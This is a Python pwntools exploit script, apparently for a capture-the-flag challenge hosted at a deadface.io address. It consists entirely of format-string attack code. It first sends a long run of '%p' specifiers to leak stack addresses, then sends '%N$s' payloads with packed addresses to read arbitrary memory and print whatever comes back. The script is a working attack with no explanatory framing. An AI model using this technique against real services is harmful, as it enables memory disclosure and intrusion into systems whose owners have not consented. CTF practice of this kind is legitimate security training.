#!/usr/bin/env python3
from pwn import *
import re

HOST="echochamber.deadface.io"
PORT=13337

p = remote(HOST, PORT, timeout=5)
try:
    try: p.recvuntil(b"\n", timeout=1)
    except: pass
    p.sendline(("%p."*60).encode())
    out = p.recvline(timeout=2).decode(errors='ignore')
finally:
    p.close()

print("Stack dump:", out)
addrs = re.findall(r'0x[0-9a-fA-F]+', out)
print("Found addresses:", addrs[:30])

# ahora probar leer cada dirección
for a in addrs:
    try:
        addr = int(a,16)
        print("\nTrying addr",a)
        for pos in range(1,30):
            p = remote(HOST, PORT, timeout=5)
            try:
                try: p.recvuntil(b"\n", timeout=0.5)
                except: pass
                payload = f"%{pos}$s".encode() + b"BBBB" + p64(addr)
                p.sendline(payload)
                resp = p.recvline(timeout=2).decode(errors='ignore')
                if len(resp) > 10 and "deadface" in resp.lower() or any(ch.isalpha() for ch in resp.strip()):
                    print("pos",pos,"->",resp)
            except Exception:
                pass
            finally:
                p.close()
    except Exception:
        pass
